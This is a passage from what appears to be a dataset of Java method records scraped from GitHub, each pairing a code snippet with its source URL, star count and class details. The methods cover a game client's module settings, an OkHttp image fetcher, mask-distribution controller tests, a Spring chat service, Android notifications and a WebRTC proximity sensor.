onDisable() {    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onToggle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onToggle() {    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toggle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void toggle() {        setEnabled(!isEnabled());    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "save", "params": ["JsonObject"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void save(JsonObject destination) {        if (Mercury.INSTANCE.getPropertyManager().getPropertiesFromObject(this) != null) {            Mercury.INSTANCE.getPropertyManager().getPropertiesFromObject(this).forEach(property -> destination.addProperty(property.getLabel(), property.getValue().toString()));        }        destination.addProperty(\"Bind\", getBind());        if (!this.isPersistent())            destination.addProperty(\"Enabled\", isEnabled());        destination.addProperty(\"Hidden\", isHidden());        destination.addProperty(\"FakeLabel\", getFakeLabel());    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "load", "params": ["JsonObject"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void load(JsonObject source) {        source.entrySet().forEach(entry -> {            if (Mercury.INSTANCE.getPropertyManager().getPropertiesFromObject(this) != null) {                source.entrySet().forEach(entri -> Mercury.INSTANCE.getPropertyManager().getProperty(this, entri.getKey()).ifPresent(property -> property.setValue(entri.getValue().getAsString())));            }            switch (entry.getKey()) {                case \"Enabled\":                    if (!this.isPersistent()) {                        if (entry.getValue().getAsBoolean()) {                            setEnabled(entry.getValue().getAsBoolean());                        }                    }                    break;                case \"Hidden\":                    if (entry.getValue().getAsBoolean()) {                        setHidden(entry.getValue().getAsBoolean());                    }                    break;                case \"Bind\":                    setBind(entry.getValue().getAsInt());                    break;                case \"FakeLabel\":                    setFakeLabel(entry.getValue().getAsString());                    break;            }        });    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/module/Module.java", "stars": "12", "class": {"name": "Module", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "loadData", "params": ["Priority", "DataFetcher"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void loadData(@NonNull Priority priority,                         @NonNull final DataFetcher.DataCallback<? super InputStream> callback) {        Request.Builder requestBuilder = new Request.Builder().url(mGlideUrl.toStringUrl());        for (Map.Entry<String, String> headerEntry : mGlideUrl.getHeaders().entrySet()) {            String key = headerEntry.getKey();            requestBuilder.addHeader(key, headerEntry.getValue());        }        Request request = requestBuilder.build();        mDataCallback = callback;        mCall = mCallFactory.newCall(request);        mCall.enqueue(this);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/glide/OkHttpFetcher.java", "stars": "1", "class": {"name": "OkHttpFetcher", "extends": null, "implements": ["DataFetcher", "Callback"], "modifiers": ["public"]}}, {"method_name": "onFailure", "params": ["Call", "IOException"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFailure(@NonNull Call call, @NonNull IOException e) {        mDataCallback.onLoadFailed(e);    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/glide/OkHttpFetcher.java", "stars": "1", "class": {"name": "OkHttpFetcher", "extends": null, "implements": ["DataFetcher", "Callback"], "modifiers": ["public"]}}, {"method_name": "onResponse", "params": ["Call", "Response"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResponse(@NonNull Call call, @NonNull Response response) {        mResponseBody = response.body();        if (response.isSuccessful()) {            long contentLength = Preconditions.checkNotNull(mResponseBody).contentLength();            mInputStream = ContentLengthInputStream.obtain(mResponseBody.byteStream(), contentLength);            mDataCallback.onDataReady(mInputStream);        } else {            mDataCallback.onLoadFailed(new HttpException(response.message(), response.code()));        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/glide/OkHttpFetcher.java", "stars": "1", "class": {"name": "OkHttpFetcher", "extends": null, "implements": ["DataFetcher", "Callback"], "modifiers": ["public"]}}, {"method_name": "cleanup", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cleanup() {        try {            if (mInputStream != null) {                mInputStream.close();            }        } catch (IOException ignored) {}        if (mResponseBody != null) {            mResponseBody.close();        }        mDataCallback = null;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/glide/OkHttpFetcher.java", "stars": "1", "class": {"name": "OkHttpFetcher", "extends": null, "implements": ["DataFetcher", "Callback"], "modifiers": ["public"]}}, {"method_name": "cancel", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void cancel() {        if (mCall != null) {            mCall.cancel();        }    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/glide/OkHttpFetcher.java", "stars": "1", "class": {"name": "OkHttpFetcher", "extends": null, "implements": ["DataFetcher", "Callback"], "modifiers": ["public"]}}, {"method_name": "getDataClass", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<InputStream>", "snippet": "    public Class<InputStream> getDataClass() {        return InputStream.class;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/glide/OkHttpFetcher.java", "stars": "1", "class": {"name": "OkHttpFetcher", "extends": null, "implements": ["DataFetcher", "Callback"], "modifiers": ["public"]}}, {"method_name": "getDataSource", "params": [], "throws": null, "modifiers": ["public"], "return_type": "DataSource", "snippet": "    public DataSource getDataSource() {        return DataSource.REMOTE;    }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/glide/OkHttpFetcher.java", "stars": "1", "class": {"name": "OkHttpFetcher", "extends": null, "implements": ["DataFetcher", "Callback"], "modifiers": ["public"]}}, {"method_name": "distribuerMasques_devrait_rediriger_vers_la_page_d_accueil_de_l_application_quand_le_cookie_code_postal_n_est_pas_present", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "    void distribuerMasques_devrait_rediriger_vers_la_page_d_accueil_de_l_application_quand_le_cookie_code_postal_n_est_pas_present() throws Exception {        // Given        Cookie cookieTypeRemettant = new Cookie(NOM_COOKIE_TYPE_REMETTANT, TYPE_REMETTANT);        // When Then        mockMvc.perform(MockMvcRequestBuilders.post(\"/distribution-masques\")                .cookie(cookieTypeRemettant))                .andExpect(view().name(\"redirect:/\"))                .andExpect(status().is3xxRedirection());    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/DistributionMasquesControllerTest.java", "stars": "5", "class": {"name": "DistributionMasquesControllerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "distribuerMasques_devrait_rediriger_vers_la_page_d_accueil_de_l_application_quand_le_cookie_type_remettant_n_est_pas_present", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "    void distribuerMasques_devrait_rediriger_vers_la_page_d_accueil_de_l_application_quand_le_cookie_type_remettant_n_est_pas_present() throws Exception {        // Given        Cookie cookieCodePostal = new Cookie(NOM_COOKIE_CODE_POSTAL_REMETTANT, CODE_POSTAL);        // When Then        mockMvc.perform(MockMvcRequestBuilders.post(\"/distribution-masques\")                .cookie(cookieCodePostal))                .andExpect(view().name(\"redirect:/\"))                .andExpect(status().is3xxRedirection());    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/DistributionMasquesControllerTest.java", "stars": "5", "class": {"name": "DistributionMasquesControllerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "distribuerMasques_devrait_distribuer_les_masques_et_retourner_la_page_de_confirmation_quand_les_cookies_sont_presents", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "    void distribuerMasques_devrait_distribuer_les_masques_et_retourner_la_page_de_confirmation_quand_les_cookies_sont_presents() throws Exception {        // Given        List<DistributionMasque> distributionMasques = List.of(DistributionMasqueFixture.aDistributionMasque(), DistributionMasqueFixture.aDistributionMasque());        when(distributionMasqueUIMapper.toDistributionMasques(any(DistributionMasqueUI.class), eq(CODE_POSTAL), eq(TYPE_REMETTANT))).thenReturn(distributionMasques);        Cookie cookieCodePostal = new Cookie(NOM_COOKIE_CODE_POSTAL_REMETTANT, CODE_POSTAL);        Cookie cookieTypeRemettant = new Cookie(NOM_COOKIE_TYPE_REMETTANT, TYPE_REMETTANT);        // When Then        mockMvc.perform(MockMvcRequestBuilders.post(\"/distribution-masques\")                .cookie(cookieCodePostal, cookieTypeRemettant)                .param(\"hashIdentite\", \"08c71b89ac55b6826a2daa9fe89edea26de\")                .param(\"nombreMineurs\", \"2\")                .param(\"modeSaisie\", SCAN.name())                .param(\"nbMasquesAdulteUsageUnique\", \"5\")                .param(\"nbMasquesAdulteReutilisables\", \"33\"))                .andExpect(view().name(\"confirmation-distribution-masques\"))                .andExpect(status().isOk())                .andExpect(content().string(containsString(\"Remise de masques valid\u00e9e\")));        verify(distribuerMasques).distribuer(distributionMasques);    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/test/java/fr/gouv/interieur/dmgp/remettant/application/ui/DistributionMasquesControllerTest.java", "stars": "5", "class": {"name": "DistributionMasquesControllerTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "onReady", "params": ["AtmosphereResource"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onReady(AtmosphereResource resource) {\t\tthis.logger.info(\"Connected \" + resource.uuid());\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-atmosphere/src/main/java/smoketest/atmosphere/ChatService.java", "stars": "47572", "class": {"name": "ChatService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onDisconnect", "params": ["AtmosphereResourceEvent"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onDisconnect(AtmosphereResourceEvent event) {\t\tthis.logger.info(\"Client \" + event.getResource().uuid() + \" disconnected [\"\t\t\t\t+ (event.isCancelled() ? \"cancelled\" : \"closed\") + \"]\");\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-atmosphere/src/main/java/smoketest/atmosphere/ChatService.java", "stars": "47572", "class": {"name": "ChatService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onMessage", "params": ["Message"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "Message", "snippet": "\tpublic Message onMessage(Message message) throws IOException {\t\tthis.logger.info(\"Author \" + message.getAuthor() + \" sent message \" + message.getMessage());\t\treturn message;\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-atmosphere/src/main/java/smoketest/atmosphere/ChatService.java", "stars": "47572", "class": {"name": "ChatService", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encode", "params": ["Message"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\t\tpublic String encode(Message m) {\t\t\ttry {\t\t\t\treturn this.mapper.writeValueAsString(m);\t\t\t}\t\t\tcatch (IOException ex) {\t\t\t\tthrow new IllegalStateException(ex);\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-atmosphere/src/main/java/smoketest/atmosphere/ChatService.java", "stars": "47572", "class": {"name": "JacksonEncoderDecoder", "extends": null, "implements": ["Encoder", "Decoder"], "modifiers": ["public", "static"]}}, {"method_name": "decode", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Message", "snippet": "\t\tpublic Message decode(String s) {\t\t\ttry {\t\t\t\treturn this.mapper.readValue(s, Message.class);\t\t\t}\t\t\tcatch (IOException ex) {\t\t\t\tthrow new IllegalStateException(ex);\t\t\t}\t\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-tests/spring-boot-smoke-tests/spring-boot-smoke-test-atmosphere/src/main/java/smoketest/atmosphere/ChatService.java", "stars": "47572", "class": {"name": "JacksonEncoderDecoder", "extends": null, "implements": ["Encoder", "Decoder"], "modifiers": ["public", "static"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\t\tSpringApplication.run(MusicApiApplication.class, args);\t}", "url": "https://raw.githubusercontent.com/aayush-grover/SoundCloud-Rest-Api/master/musichoster-api/src/main/java/com/upgrad/musichoster/api/MusicApiApplication.java", "stars": "2", "class": {"name": "MusicApiApplication", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "blitQuarter", "params": ["int", "int", "BufferedImage", "BufferedImage"], "throws": null, "modifiers": ["private", "static"], "return_type": "void", "snippet": "\tprivate static void blitQuarter(int offsetX, int offsetY, BufferedImage src, BufferedImage dst) {\t\tint w = src.getWidth() / 2;\t\tint h = src.getHeight() / 2;\t\tint x = w * offsetX;\t\tint y = h * offsetY;\t\tfor(int i = x; i < w + x; i++) {\t\t\tfor(int j = y; j < h + y; j++) {\t\t\t\tdst.setRGB(i, j, src.getRGB(i, j));\t\t\t}\t\t}\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/tile/provider/CompactTileProvider.java", "stars": "3", "class": {"name": "CompactTileProvider", "extends": null, "implements": ["TileProvider"], "modifiers": ["public"]}}, {"method_name": "getIdsToLoad", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<SpriteIdentifier>", "snippet": "\tpublic List<SpriteIdentifier> getIdsToLoad() {\t\treturn spriteIds;\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/tile/provider/CompactTileProvider.java", "stars": "3", "class": {"name": "CompactTileProvider", "extends": null, "implements": ["TileProvider"], "modifiers": ["public"]}}, {"method_name": "load", "params": ["Function<SpriteIdentifier,Sprite>"], "throws": null, "modifiers": ["public"], "return_type": "Sprite", "snippet": "\tpublic Sprite[] load(Function<SpriteIdentifier, Sprite> textureGetter) {\t\tSprite[] sprites = new Sprite[spriteIds.size()];\t\tfor(int i = 0; i < sprites.length; i++) {\t\t\tsprites[i] = textureGetter.apply(spriteIds.get(i));\t\t}\t\treturn sprites;\t}", "url": "https://raw.githubusercontent.com/Nuclearfarts/connected-block-textures/master/src/main/java/io/github/nuclearfarts/cbt/tile/provider/CompactTileProvider.java", "stars": "3", "class": {"name": "CompactTileProvider", "extends": null, "implements": ["TileProvider"], "modifiers": ["public"]}}, {"method_name": "onFailure", "params": ["Call", "IOException"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onFailure(@NonNull Call call, IOException e) {        onFail(new BaseError());    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/HttpItemCallback.java", "stars": "2", "class": {"name": "HttpItemCallback", "extends": null, "implements": ["Callback"], "modifiers": ["public", "abstract"]}}, {"method_name": "onResponse", "params": ["Call", "Response"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {        if (response.isSuccessful()) {            ResponseBody body = response.body();            if (body == null) {                onFail(new BaseError());            } else {                String value = body.string();                ResponeModel<T> responeModel = JSON.parseObject(value,                        new TypeReference<ResponeModel<T>>() {                        });                onSuccess(responeModel.getObject());            }        } else {            onFail(new BaseError(response.code(), response.message()));        }    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/HttpItemCallback.java", "stars": "2", "class": {"name": "HttpItemCallback", "extends": null, "implements": ["Callback"], "modifiers": ["public", "abstract"]}}, {"method_name": "onSuccess", "params": ["T"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onSuccess(T data);    public abstract void onFail(BaseError error);}", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/HttpItemCallback.java", "stars": "2", "class": {"name": "HttpItemCallback", "extends": null, "implements": ["Callback"], "modifiers": ["public", "abstract"]}}, {"method_name": "onFail", "params": ["BaseError"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onFail(BaseError error);}", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/data/HttpItemCallback.java", "stars": "2", "class": {"name": "HttpItemCallback", "extends": null, "implements": ["Callback"], "modifiers": ["public", "abstract"]}}, {"method_name": "onBind", "params": ["Intent"], "throws": null, "modifiers": ["public"], "return_type": "IBinder", "snippet": "    public IBinder onBind(Intent intent) {        return null;    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "handleIntent", "params": ["Intent"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void handleIntent( Intent intent ) {        if( intent == null || intent.getAction() == null )            return;        String action = intent.getAction();        if(mMediaControl == null) {            Intent stopIntent = new Intent( getApplicationContext(), BeamPlayerNotificationService.class );            stopService(stopIntent);            return;        }        if( action.equalsIgnoreCase( ACTION_PLAY ) || action.equalsIgnoreCase( ACTION_PAUSE ) ) {            ResponseListener<Object> responseListener = new ResponseListener<Object>() {                @Override                public void onSuccess(Object object) {                    mMediaControl.getPlayState(mPlayStateListener);                }                @Override                public void onError(ServiceCommandError error) {                    mMediaControl.getPlayState(mPlayStateListener);                }            };            if(mIsPlaying) {                mIsPlaying = false;                mMediaControl.pause(responseListener);                buildNotification(generateAction(R.drawable.ic_av_play, \"Play\", ACTION_PLAY));            } else {                mIsPlaying = true;                mMediaControl.play(responseListener);                buildNotification(generateAction(R.drawable.ic_av_pause, \"Pause\", ACTION_PAUSE));            }            mMediaControl.getPlayState(mPlayStateListener);        } else if( action.equalsIgnoreCase( ACTION_FAST_FORWARD ) ) {            mMediaControl.getPosition(new MediaControl.PositionListener() {                @Override                public void onSuccess(Long object) {                    long seek = object + 10000;                    mMediaControl.seek(seek, null);                }                @Override                public void onError(ServiceCommandError error) {                }            });        } else if( action.equalsIgnoreCase( ACTION_REWIND ) ) {            mMediaControl.getPosition(new MediaControl.PositionListener() {                @Override                public void onSuccess(Long object) {                    long seek = object - 10000;                    mMediaControl.seek(seek, null);                }                @Override                public void onError(ServiceCommandError error) {                }            });        } else if( action.equalsIgnoreCase( ACTION_STOP ) ) {            mManager.stopVideo();        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "generateAction", "params": ["int", "String", "String"], "throws": null, "modifiers": ["private"], "return_type": "NotificationCompat", "snippet": "    private NotificationCompat.Action generateAction( int icon, String title, String intentAction ) {        Intent intent = new Intent( getApplicationContext(), BeamPlayerNotificationService.class );        intent.setAction(intentAction);        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);        return new NotificationCompat.Action.Builder( icon, title, pendingIntent ).build();    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "buildNotification", "params": ["NotificationCompat"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void buildNotification( NotificationCompat.Action action ) {        if(mManager.getStreamInfo() == null)            return;        MediaStyle style = new MediaStyle();        Intent intent = new Intent(this, BeamPlayerNotificationService.class);        intent.setAction( ACTION_STOP );        PendingIntent pendingIntent = PendingIntent.getService(getApplicationContext(), 1, intent, 0);        NotificationCompat.Builder builder = (NotificationCompat.Builder) new NotificationCompat.Builder(this)                .setSmallIcon(R.drawable.ic_notif_logo)                .setContentTitle(mManager.getStreamInfo().getTitle() == null ? \"Video\" : mManager.getStreamInfo().getTitle())                .setContentText(getResources().getString(R.string.app_name))                .setDeleteIntent(pendingIntent)                .setStyle(style)                .setAutoCancel(false)                .setOngoing(true)                .setOnlyAlertOnce(true)                .setPriority(NotificationCompat.PRIORITY_HIGH)                .setVisibility(NotificationCompat.VISIBILITY_PUBLIC);        builder.addAction(generateAction(R.drawable.ic_av_rewind, \"Rewind\", ACTION_REWIND));        builder.addAction(action);        builder.addAction(generateAction(R.drawable.ic_av_forward, \"Fast Foward\", ACTION_FAST_FORWARD));        style.setShowActionsInCompactView(0,1,2);        if(mImage != null) {            builder.setLargeIcon(mImage);        }        Notification notification = builder.build();        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);        notificationManager.notify( NOTIFICATION_ID, notification );    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "cancelNotification", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void cancelNotification() {        // Remove beamplayer notification if still available        NotificationManager notificationManager = (NotificationManager) ButterApplication.getAppContext().getSystemService(Context.NOTIFICATION_SERVICE);        notificationManager.cancel(BeamPlayerNotificationService.NOTIFICATION_ID);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "onStartCommand", "params": ["Intent", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int onStartCommand(Intent intent, int flags, int startId) {        if( mManager == null ) {            initMediaSessions();        } else {            handleIntent(intent);        }        return super.onStartCommand(intent, flags, startId);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "initMediaSessions", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void initMediaSessions() {        mManager = BeamManager.getInstance(this);        if(mManager.getConnectedDevice() != null) {            mMediaControl = mManager.getMediaControl();            mMediaControl.subscribePlayState(mPlayStateListener);            mManager.addDeviceListener(mDeviceListener);            mMediaControl.getPlayState(mPlayStateListener);            if(mManager.getStreamInfo().getImageUrl() != null)                Picasso.get().load(mManager.getStreamInfo().getImageUrl()).resize(400, 400).centerInside().into(new Target() {                    @Override                    public void onBitmapLoaded(Bitmap bitmap, Picasso.LoadedFrom from) {                        mImage = bitmap;                        if(!mIsPlaying) {                            buildNotification( generateAction(R.drawable.ic_av_play, \"Play\", ACTION_PLAY ) );                        } else {                            buildNotification( generateAction(R.drawable.ic_av_pause, \"Pause\", ACTION_PAUSE ) );                        }                    }                    @Override                    public void onBitmapFailed(Exception exc, Drawable errorDrawable) {                    }                    @Override                    public void onPrepareLoad(Drawable placeHolderDrawable) {                    }                });        }    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "onUnbind", "params": ["Intent"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean onUnbind(Intent intent) {        return super.onUnbind(intent);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "onDestroy", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDestroy() {        super.onDestroy();        NotificationManager notificationManager = (NotificationManager) getApplicationContext().getSystemService(Context.NOTIFICATION_SERVICE);        notificationManager.cancel(1);    }", "url": "https://raw.githubusercontent.com/abdalmoniem/Movie-App/master/base/src/main/java/butter/droid/base/beaming/BeamPlayerNotificationService.java", "stars": "4", "class": {"name": "BeamPlayerNotificationService", "extends": "Service", "implements": null, "modifiers": ["public"]}}, {"method_name": "create", "params": ["Context", "Runnable"], "throws": null, "modifiers": ["static"], "return_type": "AppRTCProximitySensor", "snippet": "  static AppRTCProximitySensor create(Context context, Runnable sensorStateListener) {    return new AppRTCProximitySensor(context, sensorStateListener);  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "start", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean start() {    threadChecker.checkIsOnValidThread();    Log.d(TAG, \"start\" + AppRTCUtils.getThreadInfo());    if (!initDefaultSensor()) {      // Proximity sensor is not supported on this device.      return false;    }    sensorManager.registerListener(this, proximitySensor, SensorManager.SENSOR_DELAY_NORMAL);    return true;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "stop", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void stop() {    threadChecker.checkIsOnValidThread();    Log.d(TAG, \"stop\" + AppRTCUtils.getThreadInfo());    if (proximitySensor == null) {      return;    }    sensorManager.unregisterListener(this, proximitySensor);  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "sensorReportsNearState", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean sensorReportsNearState() {    threadChecker.checkIsOnValidThread();    return lastStateReportIsNear;  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "onAccuracyChanged", "params": ["Sensor", "int"], "throws": null, "modifiers": ["public", "final"], "return_type": "void", "snippet": "  public final void onAccuracyChanged(Sensor sensor, int accuracy) {    threadChecker.checkIsOnValidThread();    AppRTCUtils.assertIsTrue(sensor.getType() == Sensor.TYPE_PROXIMITY);    if (accuracy == SensorManager.SENSOR_STATUS_UNRELIABLE) {      Log.e(TAG, \"The values returned by this sensor cannot be trusted\");    }  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "onSensorChanged", "params": ["SensorEvent"], "throws": null, "modifiers": ["public", "final"], "return_type": "void", "snippet": "  public final void onSensorChanged(SensorEvent event) {    threadChecker.checkIsOnValidThread();    AppRTCUtils.assertIsTrue(event.sensor.getType() == Sensor.TYPE_PROXIMITY);    // As a best practice; do as little as possible within this method and    // avoid blocking.    float distanceInCentimeters = event.values[0];    if (distanceInCentimeters < proximitySensor.getMaximumRange()) {      Log.d(TAG, \"Proximity sensor => NEAR state\");      lastStateReportIsNear = true;    } else {      Log.d(TAG, \"Proximity sensor => FAR state\");      lastStateReportIsNear = false;    }    // Report about new state to listening client. Client can then call    // sensorReportsNearState() to query the current state (NEAR or FAR).    if (onSensorStateListener != null) {      onSensorStateListener.run();    }    Log.d(TAG, \"onSensorChanged\" + AppRTCUtils.getThreadInfo() + \": \"            + \"accuracy=\" + event.accuracy + \", timestamp=\" + event.timestamp + \", distance=\"            + event.values[0]);  }", "url": "https://raw.githubusercontent.com/agent10/androidwebrtcexample/master/app/src/main/java/org/appspot/apprtc/AppRTCProximitySensor.java", "stars": "2", "class": {"name": "AppRTCProximitySensor", "extends": null, "implements": ["SensorEventListener"], "modifiers": ["public"]}}, {"method_name": "initDefaultSensor", "params": [], "throws": null, "modifiers": 